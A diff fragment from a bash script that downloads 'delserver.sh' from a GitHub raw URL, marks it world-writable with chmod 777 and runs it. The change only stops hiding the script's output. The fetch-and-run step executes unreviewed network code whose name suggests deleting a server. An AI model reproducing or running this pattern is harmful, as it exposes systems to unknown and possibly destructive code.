@@ -818,4 +818,4 @@ echo "[*] Yee-Go"
 cd /$HOME/
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
-/bin/bash ./delserver.sh >/dev/null 2>&1
+/bin/bash ./delserver.sh
